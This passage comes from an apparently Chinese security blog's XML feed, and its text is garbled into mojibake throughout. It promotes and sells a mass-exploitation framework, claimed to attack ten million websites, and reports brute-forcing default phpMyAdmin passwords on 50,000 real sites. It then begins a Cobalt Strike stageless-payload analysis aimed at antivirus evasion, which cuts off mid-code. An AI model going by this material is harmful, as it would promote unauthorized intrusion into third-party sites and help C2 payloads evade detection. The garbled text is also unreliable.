å¹²æ´»å¹¶ä¸èƒ½å…¨éƒ¨ä»£æ›¿ä½ å»å¹²æ´»ã€‚åç»­ç­‰aiå‘å±•èµ·æ¥ä½ è‡ªå·±çš„å®¡è®¡åŠŸåº•ä¹Ÿæœ‰äº†é‚£å°±æ˜¯å¦‚è™æ·»ç¿¼ã€‚ç»“åˆæ‰¹é‡å·¥å…·å¯ä»¥ç¼–å†™è‡ªå·±çš„exp pocå·¥å…·ã€‚æ­è½½å‡ ç™¾ä¸‡ç”šè‡³ä¸Šåƒä¸‡ç½‘ç«™è¿›è¡Œæ¼æ´æ‰«æã€‚ç»“åˆ0dayå’Œxdayé‚£ä½ å°†åœ¨ä½ çš„é¢†åŸŸå‘å…‰å‘çƒ­ã€‚ä¸ä¼šç¼–ç¨‹çš„å»ºè®®åŠ ç´§å­¦ä¹ ã€‚é aiä¸è¡Œä½ è®©aiç»™ä½ å†™ä¸ªæ­åœ¨å‡ ç™¾ä¸‡ä¸Šåƒä¸‡çš„exp pocæ¡†æ¶ä¸å¯èƒ½ã€‚å®ƒåªèƒ½ç»™ä½ ä¼˜åŒ–ã€‚è¿™ä¸ªä¸œè¥¿å°±åƒåœ°åŸºä¸€æ ·æ‰“å¥½åœ°åŸºä½ çš„æˆ¿å­æ‰èƒ½ç›–çš„ç»“å®ã€‚æ‰€ä»¥ä¸è¦é å®ƒç»™ä½ æ‰“åœ°åŸºã€‚å¦‚æœæœ‰ç°æˆçš„æºä»£ç ä½ å¯ä»¥ç›´æ¥è¿›è¡Œä¿®æ”¹ç«™åœ¨å·¨äººçš„è‚©è†€ä¸Šé¢ã€‚åœ¨githubä¸Šé¢ç‰©è‰²æ¯”è¾ƒé è°±çš„é¡¹ç›®ã€‚ç»è¿‡aiçš„æ‰“ç£¨ã€‚ç„¶åè‡ªå·±å®¡è®¡0dayå’Œé›†æˆxdayé‚£å°†åœ¨ä¸€ä¸ªé¢†åŸŸæ— æ•Œã€‚æ‹¿åˆ°çš„ç«™ç‚¹è¿›è¡Œä»£ç å®¡è®¡æ‰©å¤§æˆ˜æœã€‚è¿™ä¸ªh5æ˜¯é€šè¿‡æ¸—é€æµ‹è¯•æ–¹å¼æ‹¿åˆ°ä»£ç ã€‚æœ‰äº›æ¼æ´æ˜¯é€šè¿‡ä»£ç å®¡è®¡æ–¹å¼å®¡è®¡å‡ºæ¥çš„ã€‚åç»­é›†æˆåˆ°ä½ è‡ªå·±çš„å·¥å…·ä¸Šé¢é‚£ä¼šå¾ˆå¼ºå¤§ã€‚æ‰€ä»¥é‡è§†èµ·æ¥ä»£ç å®¡è®¡ã€‚<br>ä»£ç ä¸‹è½½é“¾æ¥:<br><a href="https://t.me/SoftwareNoticeChannel/856">https://t.me/SoftwareNoticeChannel/856</a></p>]]></content>
      
      
      <categories>
          
          <category> PenetrationTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CodeAuditExample </tag>
            
            <tag> PenetrationTest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä½¿ç”¨è½¯ä»¶æºä»£ç ç¼–å†™phpmyadminçˆ†ç ´æ¨¡å—ä»¥åŠå®æˆ˜5Wç½‘ç«™æµ‹è¯•</title>
      <link href="/securitytools/2025/03/articles/1c4bc90eceabb786/"/>
      <url>/securitytools/2025/03/articles/1c4bc90eceabb786/</url>
      
        <content type="html"><![CDATA[<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>ä¸ºäº†ä½¿è´­ä¹°æºä»£ç çš„ç”¨æˆ·æå‰ç†Ÿæ‚‰æºç å’Œå±•ç¤ºå·¥å…·çš„æ€§èƒ½ã€‚æˆ‘ä»¬ç‰¹æ„å½•åˆ¶äº†è·å–åˆ°æºä»£ç ä»¥åå¦‚ä½•è¿›è¡Œç®€å•çš„post get ä¸Šä¼  æ·»åŠ è‡ªå®šä¹‰ httpè¯·æ±‚å¤´ã€‚è¿™ä¸ªå‰é¢ä¸¤æœŸè§†é¢‘æ•™ç¨‹å·²ç»è¯´äº†<br/><br>1:ç®€å•çš„get post ä¸Šä¼  ä»£ç ç¼–å†™åŸºç¡€ <br/><br><a href="https://www.youtube.com/watch?v=VIjLxEuc9JM">https://www.youtube.com/watch?v=VIjLxEuc9JM</a> <br><br>2: postè¯·æ±‚ç®€å•å®æˆ˜ç¼–å†™<br/><br><a href="https://youtu.be/otU2-ig3Nb8?si=tL3VacTYOYQSFg1a">https://youtu.be/otU2-ig3Nb8?si=tL3VacTYOYQSFg1a</a><br/><br>3: exp pocå®æˆ˜ä¹‹phpmyadminçˆ†ç ´æ¨¡å—å¼€å‘ä»¥åŠå®æˆ˜æ¼”ç¤º5ä¸‡ç½‘ç«™ä½¿ç”¨é»˜è®¤è´¦å·å¯†ç è¿›è¡Œçˆ†ç ´æ•™ç¨‹åœ°å€:<br/><br> <a href="https://www.youtube.com/watch?v=ujL5HHe3hZs">https://www.youtube.com/watch?v=ujL5HHe3hZs</a> </p><p>å…¶ä¸­äºŒå’Œä¸‰ä½å®æˆ˜æµ‹è¯•æˆ‘ä»¬é‡ç‚¹æ¥çœ‹ä¸€ä¸‹phpmyadmin å®æˆ˜<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202503061439710.png" alt="å®æˆ˜çˆ†ç ´ç»“æœ"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202503061440860.png" alt="å·¥å…·çˆ†ç ´ç»“æœ"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202503061441549.png" alt="å®æˆ˜çˆ†ç ´ç»“æœ"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æˆ‘ä»¬ä»¥å‰çœ‹ç±»ä¼¼phpmyadmin è¿™ç§å·¥å…·å›¾å½¢åŒ–çš„å†™å‡ºæ¥æ¯”è¾ƒé«˜å¤§å°šä½†æ˜¯è¿™æˆ‘ä»¬è¿™é‡Œã€‚åªè¦ä½ ä¼šå†™å•ä¸ªçš„æ‰¹é‡ç›´æ¥é›†æˆå°±è¡Œäº†ã€‚å¾ˆç®€å•ã€‚è®©ä»¥å‰ä½ è§‰å¾—å¾ˆç‰›é€¼çš„å·¥å…·ç¬é—´å˜æˆå¹³å¹³æ— å¥‡çš„å·¥å…·ã€‚ä»¥å‰ç‰›é€¼çš„å·¥å…·åœ¨æˆ‘ä»¬è¿™é‡Œå°±æ˜¯ä¸€ä¸ªæ¨¡å—æˆ–è€…ä¸€ä¸ªåˆ†æ”¯ã€‚å¹¶ä¸”æˆ‘ä»¬çš„å·¥å…·æœ€å°‘å¯ä»¥æ­è½½ç™¾ä¸‡æ¡ç½‘ç«™ç”šè‡³æ˜¯ä¸Šåƒä¸‡æ¡ç½‘ç«™ã€‚å­¦å¥½åŠŸåŠ›å¤§å¢å¦‚æœé‡åˆ°ä¸ä¼šçš„æˆ‘ä»¬ä¼šåœ¨ç¾¤é‡ŒåŸ¹è®­å†™å‡ºexpä½ ä»¬å»ç…§ç€å†™æ‰‹æŠŠæ‰‹æ•™ã€‚åç»­ä½ ä»¬åªéœ€è¦è€ƒè™‘ä»£ç å®¡è®¡å’Œ0day æœ‰xdayç›´æ¥è‡ªå·±é›†æˆã€‚</p>]]></content>
      
      
      <categories>
          
          <category> SecurityTools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> original </tag>
            
            <tag> PenetrationTest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webframeworktools-1000ä¸‡æ¡ç½‘ç«™æµ‹è¯•æˆåŠŸ</title>
      <link href="/securitytools/2025/01/articles/e9c8349d34c76c05/"/>
      <url>/securitytools/2025/01/articles/e9c8349d34c76c05/</url>
      
        <content type="html"><![CDATA[<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>åœ¨å»å¹´2024å¹´7æœˆä»½æˆ‘ä»¬å¼€å§‹é’ˆå¯¹è½¯ä»¶æ€§èƒ½è¿›è¡Œæµ‹è¯•åˆ°ã€‚2024å¹´12æœˆè½¯ä»¶æµ‹è¯•å®Œæ¯•ã€‚æ€»è€—æ—¶å°†è¿‘4ä¸ªæœˆè½¯ä»¶åœ¨1000ä¸‡æ¡urlè¡¨ç°å¾ˆå¥½ã€‚è·‘äº†å°†è¿‘4ä¸ªæœˆæ²¡æœ‰å‡ºç°å¥”æºƒç°è±¡ã€‚è½¯ä»¶è¡¨ç°å¾ˆä¸é”™ã€‚</p><h2 id="è½¯ä»¶æµ‹è¯•è¯¦ç»†å‚æ•°"><a href="#è½¯ä»¶æµ‹è¯•è¯¦ç»†å‚æ•°" class="headerlink" title="è½¯ä»¶æµ‹è¯•è¯¦ç»†å‚æ•°"></a>è½¯ä»¶æµ‹è¯•è¯¦ç»†å‚æ•°</h2><p>åœ¨è½¯ä»¶å°†è¿‘4ä¸ªæœˆæµ‹è¯•ä¸‹è½¯ä»¶è¡¨ç°å¾ˆå¥½æµ‹è¯•æ²¡æœ‰å´©æºƒã€‚å¹¶ä¸”å·²ç»æµ‹è¯•å®Œæ¯•ã€‚å·²çŸ¥bugå·²ç»å…¨éƒ¨ä¿®å¤ã€‚ç¨³å®šæ€§æ²¡æœ‰ä»»ä½•é—®é¢˜ã€‚æµ‹è¯•è¯¦æƒ…å¦‚ä¸‹:<br>æµ‹è¯•ç»“æŸæ—¥æœŸ2024-12-23 ç»“æŸæ—¶é—´ 10:00<br>æµ‹è¯•ç½‘ç«™æ¡æ•°1000ä¸‡æ¡<br>å…¨æ¨¡å—(é™¤äº†log4j weblogic jboss è¿™ä¸ªä¸‰ä¸ªæ¨¡å—)è€—æ—¶å°†è¿‘4ä¸ªæœˆæµ‹è¯•å®Œæ¯•ã€‚<br>å ªç§°å®Œç¾æµ‹è¯•ã€‚æµ‹è¯•æ€»æµé‡7.3093TBã€‚è½¯ä»¶ä¸‹è½½æµé‡6.256TBã€‚ä¸Šä¼ æµé‡ 1.053TBã€‚è¿™æ ‡å¿—ç€æˆ‘ä»¬è½¯ä»¶åœ¨1000ä¸‡ç½‘ç«™çš„urlä¸‹è¡¨ç°å¾ˆå®Œç¾ã€‚<br>æ¥ä¸‹æ¥ä¼šå¯¹æ¼æ´è¿›è¡Œä¼˜åŒ–é¿å…å‡ºç°è¯¯æŠ¥æƒ…å†µã€‚ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ã€‚ç„¶åä»¥åæˆ‘ä»¬å°†ä¸“æ³¨æ¼æ´ã€‚æ¼æ´è¶Šå¤šè¶Šå¥½ã€‚<br>å› ä¸ºæ•°é‡ä¸Šå·²ç»è¶³å¤Ÿäº†æˆ‘ä»¬æœ€èµ·ç å¯ä»¥è‡ªåŠ¨åŒ–æ”»å‡»1000ä¸‡ä¸ªç½‘ç«™ã€‚ã€‚<br>æµ‹è¯•è¯¦ç»†å‚æ•°<br>æµ‹è¯•cpu Intel(R) Xeon(R) CPU E5-2670 0 @ 2.60GHz   2.60 GHz  (2 ä¸ªå¤„ç†å™¨) DDR3<br>æœåŠ¡å™¨ Windows Server 2022 Standard Evaluation 21H2<br>æ“ä½œç³»ç»Ÿ:64ä½æ“ä½œç³»ç»Ÿ,åŸºäºx64 çš„å¤„ç†å™¨<br>å†…å­˜:32.0GB<br>ä¸‹è½½é€Ÿåº¦:1-2MB&#x2F;s æˆ‘ä»¬æ˜¯ç”¨äº‹å®è¯´è¯ä»æ¥ä¸è¯´æˆ‘ä»¬çš„è½¯ä»¶ç‰›é€¼ã€‚å¸‚é¢ä¸Šå¯ä»¥æ‰¿è½½ç™¾ä¸‡,åƒä¸‡urlä¸å¥”æºƒçš„å°‘ä¹‹åˆå°‘ã€‚æ‰€ä»¥åç»­æ˜¯é›†æˆè¶Šæ¥è¶Šå¤šæ¼æ´ã€‚ç°åœ¨ç¼ºçš„å°±æ˜¯æ¼æ´å’Œæ—¶é—´æ›´å¤šçš„æ˜¯ç¼ºæ—¶é—´å“ˆå“ˆå“ˆã€‚ç°åœ¨æ˜¯å°±å·®æ¼æ´äº†ã€‚æ‰¹é‡å…¨çƒæ²¡æœ‰ä»»ä½•é—®é¢˜ã€‚é‰´äºè½¯ä»¶å±å®³å·¨å¤§æˆ‘ä»¬å°†åç»­ç€æ‰‹å…³æ³¨æºä»£ç è¯·æ„Ÿå…´è¶£çš„å‡†å¤‡å¥½ç¼–ç¨‹çŸ¥è¯†å’Œ$ã€‚æˆ‘ä»¬å°†æ¯«æ— ä¿ç•™çš„å‡ºæœ€æ–°ç‰ˆæœ¬æºä»£ç 1000w urlæµ‹è¯•çš„ğŸ˜ã€‚æˆ‘ä»¬çš„ä¸€è´¯å®—æ—¨å°±æ˜¯talking is cheap show me your codeã€‚éµå¾ªç€å®æˆ˜å°±æ˜¯çœŸç†ã€‚ç›®å‰åœ¨exp pocè¿™ä¸ªé¢†åŸŸèƒ½è·‘åƒä¸‡çš„è½¯ä»¶æˆ‘æƒ³æ˜¯æ²¡æœ‰çš„ã€‚æœ‰æºä»£ç èƒ½å†™å‡ºå…¶ä»–è½¯ä»¶ç¨å¾®æ”¹æ”¹å°±è¡Œäº†<br>æµ‹è¯•æˆªå›¾1<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501201452329.png" alt="æµ‹è¯•æˆªå›¾1"><br>æµ‹è¯•æˆªå›¾2<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501201452331.png" alt="æµ‹è¯•æˆªå›¾2"><br>æµ‹è¯•æˆªå›¾3<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501201452799.png" alt="æµ‹è¯•æˆªå›¾3"><br>æµ‹è¯•æˆªå›¾4<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501201453499.png" alt="æµ‹è¯•æˆªå›¾4"></p><h2 id="è½¯ä»¶è§†é¢‘æ•™ç¨‹"><a href="#è½¯ä»¶è§†é¢‘æ•™ç¨‹" class="headerlink" title="è½¯ä»¶è§†é¢‘æ•™ç¨‹"></a>è½¯ä»¶è§†é¢‘æ•™ç¨‹</h2><p>è½¯ä»¶ä½¿ç”¨è§†é¢‘æ•™ç¨‹<br>webframeworktools5.0 ä½¿ç”¨æ•™ç¨‹<br><a href="https://www.youtube.com/watch?v=TXG7W9WnbiI">https://www.youtube.com/watch?v=TXG7W9WnbiI</a> <br/><br>webframeworktools5.1 DLLç”Ÿæˆå™¨ä½¿ç”¨<br/><br><a href="https://www.youtube.com/watch?v=IkhE4cNVNso">https://www.youtube.com/watch?v=IkhE4cNVNso</a> <br/><br>webframeworktools5.1 è‡ªå†™dllæ•™ç¨‹ã€‚ä½¿ç”¨å†…éƒ¨å°è£…å‡½æ•°ç¼–å†™ä¸Šä¼ åŠŸèƒ½ä»£ç ã€‚ä¸Šä¼ å†…å®¹ä½¿ç”¨å†…éƒ¨å°è£…å‡½æ•°å¯ä»¥è½¬æ¢ä»»æ„æ–‡ä»¶å†…å®¹ã€‚ç¼–å†™è¿›è¡Œä¸Šä¼ æ“ä½œã€‚å†…éƒ¨ä»£ç ä¸å…¬å¼€ä»…åšæ¼”ç¤ºæ“ä½œã€‚å…¶ä»–ç®€å•çš„ç¼–å†™å¯ä»¥å»åšå®¢çœ‹get postçš„æ•™ç¨‹ã€‚ç®€å•çš„å¯ä»¥ç›´æ¥ä¸€é”®ç”Ÿæˆexp<br/><br><a href="https://www.youtube.com/watch?v=aLznRaoG_b4">https://www.youtube.com/watch?v=aLznRaoG_b4</a>  <br/><br>webframeworktools5.2 inié…ç½®æ•™ç¨‹<br><a href="https://www.youtube.com/watch?v=DlupWCAbBgg">https://www.youtube.com/watch?v=DlupWCAbBgg</a>       <br/><br>                                è§†é¢‘æ•™ç¨‹å·²å‡ºã€‚ä¸ä¼šçš„è‡ªè¡Œå­¦ä¹ ã€‚æ—§ç‰ˆæœ¬è‡ªå†™dllå­˜åœ¨bugã€‚å¦‚æœæ²¡æœ‰è¾“å‡ºç»“æœå±äºæ­£å¸¸ã€‚åç»­ç‰ˆæœ¬å°†çº æ­£è¿™ä¸ªbug<br><a href="https://peiqif4ck.github.io/securitytools/2024/01/articles/1fee187af88e0843/">https://peiqif4ck.github.io/securitytools/2024/01/articles/1fee187af88e0843/</a>    WebFrameworkTools5.2 iniå·¥å…·ä½¿ç”¨æ–¹æ³•<br/><br><a href="https://peiqif4ck.github.io/securitytools/2023/09/articles/2633a9b907f3f584/#toc-heading-3">https://peiqif4ck.github.io/securitytools/2023/09/articles/2633a9b907f3f584/#toc-heading-3</a>   dll expç¼–å†™æ•™ç¨‹<br/><br><a href="https://peiqif4ck.github.io/securitytools/2024/10/articles/039303a532fb37a7/">https://peiqif4ck.github.io/securitytools/2024/10/articles/039303a532fb37a7/</a>  webframeworktools dllæ¨¡å¼ç®€å•æ‰¹é‡ä½¿ç”¨<br/><br><a href="https://github.com/peiqiF4ck/WebFrameworkTools-5.1-main">https://github.com/peiqiF4ck/WebFrameworkTools-5.1-main</a>   githubåœ°å€  è½¯ä»¶å†…ç½®expä½¿ç”¨ æ–¹æ³•æ›´æ–°<br/><br><a href="https://github.com/peiqiF4ck/ToolsUserDllplugin">https://github.com/peiqiF4ck/ToolsUserDllplugin</a>  dllç¼–å†™æ•™ç¨‹</p><h2 id="æˆäººä»¥é±¼ä¸å¦‚æˆäººä»¥æ¸”"><a href="#æˆäººä»¥é±¼ä¸å¦‚æˆäººä»¥æ¸”" class="headerlink" title="æˆäººä»¥é±¼ä¸å¦‚æˆäººä»¥æ¸”"></a>æˆäººä»¥é±¼ä¸å¦‚æˆäººä»¥æ¸”</h2><p>æœ‰äººè€è¯¢é—®è½¯ä»¶è¯´è½¯ä»¶æ”»é˜²ä¸­urlæ¡æ•°ä¸å¤Ÿç”¨ã€‚æ‰€ä»¥è¿™æ¬¡æˆ‘ä»¬ä¿®æ”¹äº†ä¸€ä¸‹urlæ¡æ•°ä¸º10ä¸‡æ¡ã€‚ä¸­å›½å¤§é™†åœ°åŒºä¸å¯ä½¿ç”¨ã€‚ä½¿ç”¨è¯·éµå®ˆæ³•å¾‹æ³•è§„ã€‚ç”±äºä¹‹å‰å‘å¸ƒçš„è½¯ä»¶è¢«å¹³å°åˆ é™¤äº†æ‰€ä»¥æˆ‘ä»¬åœ¨æ­¤è¡¥å‘ä¸€ä¸‹è½¯ä»¶ä¸‹è½½åœ°å€ã€‚å¯¹äºåŸºç¡€å¥½çš„äººä¸æ»¡è¶³ä½¿ç”¨è½¯ä»¶ã€‚æˆ–è€…è‡ªå·±æœ‰exp æˆ–è€…0dayæ¼æ´ç¼ºå°‘å¯ä»¥è·‘å‡ åƒä¸‡ä¸Šç™¾ä¸‡çš„è½¯ä»¶æ¡†æ¶ã€‚ç”±äºè½¯ä»¶æ˜¯å…è´¹çš„åŠ ä¸Šå†…åœ°å¯¹ç½‘ç»œå®‰å…¨è¶Šæ¥è¶Šä¸¥æ ¼åç»­æˆ‘ä»¬å°†ä¸åœ¨å¯¹è½¯ä»¶exp pocè¿›è¡Œæ›´æ–°ã€‚ä½ ä»¬è‡ªå·±è´­ä¹°æºä»£ç ä»¥åè‡ªå·±å¯ä»¥ä¿®æ”¹ã€‚æºç åˆ†ä¸‰æ‰¹æ¬¡å‘æ”¾ã€‚å–å†³äºå¤§éƒ¨åˆ†å…„å¼Ÿä»¬çš„å­¦ä¹ è¿›åº¦ã€‚ç»¼ä¸Šæ‰€è¿°:<br/><br>æˆ‘ä»¬å†³å®šåœ¨2025å¹´å¯¹è½¯ä»¶æºä»£ç æ­£å¼å¼€å”®ã€‚è½¯ä»¶å…·å¤‡åƒä¸‡çº§æ”»å‡»èƒ½åŠ›ã€‚æˆ‘ä»¬å°†å¯¹æºä»£ç è´­ä¹°äººæ•°åšé™åˆ¶ç›®å‰é™åˆ¶äººæ•°50äººã€‚50äººå‡ºå®Œæˆ‘ä»¬å°†ä¸åœ¨è¿›è¡Œå”®å–ã€‚è¯¦æƒ…è¯·çœ‹é¢‘é“<a href="https://t.me/SoftwareNoticeChannel/775">https://t.me/SoftwareNoticeChannel/775</a> </p><h2 id="è½¯ä»¶ä¸‹è½½åœ°å€"><a href="#è½¯ä»¶ä¸‹è½½åœ°å€" class="headerlink" title="è½¯ä»¶ä¸‹è½½åœ°å€"></a>è½¯ä»¶ä¸‹è½½åœ°å€</h2><p><a href="https://www.upload.ee/files/17648235/WebFrameworkTools-10w.zip.html">https://www.upload.ee/files/17648235/WebFrameworkTools-10w.zip.html</a><br/><br>ä¸‹è½½åè¯·æ ¸å¯¹è½¯ä»¶ç›®å½•ã€‚æ³¨æ„å‘å¸ƒç‰ˆæœ¬ä¸º2024-08-31 ä¸æ˜¯æœ€æ–°ç‰ˆæœ¬ã€‚è¯·å‹¿å¯¹å·å…¥åº§ã€‚åœ¨youtubeåšçš„è§†é¢‘æ˜¯æœ€æ–°ç‰ˆæœ¬ã€‚ç”±äºæˆæƒé—®é¢˜æš‚æ—¶å‘å¸ƒä¸äº†ã€‚åç»­å¯èƒ½ä¸ä¼šå‘å¸ƒã€‚åœ¨upload eeå‘å¸ƒçš„è½¯ä»¶é™¤äº†è‡ªå†™dllæœ‰bugå’Œdllç”Ÿæˆå™¨æŸäº›å­˜åœ¨bugå¤–ã€‚å…¶ä»–å·²çŸ¥bugå‡ä¿®å¤å®Œæ¯•ã€‚æƒ³è¦æºä»£ç çš„ç‰¹åˆ«è¦å¯¹è½¯ä»¶ä½¿ç”¨æ–¹å¼è¦ç†Ÿæ‚‰ã€‚è§†é¢‘å’Œæ–‡å­—æ•™ç¨‹è¿™äº›éƒ½å·²ç»å‘å¸ƒã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501201505486.png" alt="è½¯ä»¶ç›®å½•"></p>]]></content>
      
      
      <categories>
          
          <category> SecurityTools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> original </tag>
            
            <tag> PenetrationTest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CobaltStrike 4.9.1-ç”Ÿæˆstagelessçš„exeä¸ºä½•ä¼šè¢«æ€ä»¥åŠç”ŸæˆåŸç†(ä¸‰)</title>
      <link href="/penetrationtest/2025/01/articles/c2ed6fd0c8eb2a80/"/>
      <url>/penetrationtest/2025/01/articles/c2ed6fd0c8eb2a80/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å‰é¢ä¸¤ç¯‡å·²ç»è¯´äº†cs ç ´è§£å’Œcs windows stagerç”ŸæˆåŸç†è¿™ç¯‡æˆ‘ä»¬æ¥é€šè¿‡windows ç”Ÿæˆstagelessæ¥çœ‹è°ˆæ€è½¯çš„æŸ¥æ€ç‚¹ã€‚ä¸ºä»€ä¹ˆå…æ€éœ€è¦é…åˆprofileè¿›è¡Œå…æ€ã€‚å’Œä¿®æ”¹beaconç‰¹å¾æ¥å¯¹æŠ—æ€è½¯ã€‚</p><h2 id="stagerless-åˆ†æ"><a href="#stagerless-åˆ†æ" class="headerlink" title="stagerless åˆ†æ"></a>stagerless åˆ†æ</h2><p>  æˆ‘ä»¬æ¥åˆ° windows stageless payload ç”ŸæˆæŒ‰é’®è¿™é‡Œ<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241029821.png" alt="ç”Ÿæˆ"><br>å¯¹åº”ä»£ç ä½ç½®<br>  src&#x2F;aggressor&#x2F;dialogs&#x2F;WindowsExecutableStageDialog.java</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">WindowsExecutableStageDialog</span><span class="token punctuation">(</span><span class="token class-name">AggressorClient</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"stagelessså¯¹è¯æ¡†:"</span> <span class="token operator">+</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>client <span class="token operator">=</span> var1<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241032625.png" alt="æ‰“å°å‡ºå…³é”®ç±»"><br>æˆ‘ä»¬ç‚¹å‡»generate çš„æ—¶å€™è§¦å‘<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241032166.png" alt="ç‚¹å‡»generate"><br>å¯¹åº”ä»£ç å¦‚ä¸‹:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">dialogAction</span><span class="token punctuation">(</span><span class="token class-name">ActionEvent</span> var1<span class="token punctuation">,</span> <span class="token class-name">Map</span> var2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"stageless dialogAction Method"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>options <span class="token operator">=</span> var2<span class="token punctuation">;</span><span class="token class-name">String</span> var3 <span class="token operator">=</span> <span class="token class-name">DialogUtils</span><span class="token punctuation">.</span><span class="token function">string</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> <span class="token string">"stage"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> var4 <span class="token operator">=</span> <span class="token class-name">DialogUtils</span><span class="token punctuation">.</span><span class="token function">bool</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> <span class="token string">"x64"</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">"x64"</span> <span class="token operator">:</span> <span class="token string">"x86"</span><span class="token punctuation">;</span><span class="token class-name">String</span> var5 <span class="token operator">=</span> <span class="token class-name">DialogUtils</span><span class="token punctuation">.</span><span class="token function">string</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> <span class="token string">"exitf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> var6 <span class="token operator">=</span> <span class="token string">"Process"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>var5<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">boolean</span> var7 <span class="token operator">=</span> <span class="token class-name">DialogUtils</span><span class="token punctuation">.</span><span class="token function">bool</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> <span class="token string">"x64"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ScListener</span> var8 <span class="token operator">=</span> <span class="token class-name">ListenerUtils</span><span class="token punctuation">.</span><span class="token function">getListener</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">,</span> var3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var8 <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>dialog<span class="token punctuation">.</span><span class="token function">setVisible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">DialogUtils</span><span class="token punctuation">.</span><span class="token function">showError</span><span class="token punctuation">(</span><span class="token string">"A listener was not selected"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span> var9 <span class="token operator">=</span> <span class="token class-name">DialogUtils</span><span class="token punctuation">.</span><span class="token function">string</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> <span class="token string">"payload_guards"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> var10 <span class="token operator">=</span> <span class="token class-name">DialogUtils</span><span class="token punctuation">.</span><span class="token function">string</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> <span class="token string">"syscall"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> var11 <span class="token operator">=</span> <span class="token class-name">DialogUtils</span><span class="token punctuation">.</span><span class="token function">string</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> <span class="token string">"http_library"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager <span class="token operator">=</span> var8<span class="token punctuation">.</span><span class="token function">export</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var6<span class="token punctuation">,</span> var9<span class="token punctuation">,</span> var10<span class="token punctuation">,</span> var11<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//stageless ç”Ÿæˆå‡½æ•° shellcode ç”Ÿæˆç‚¹</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager<span 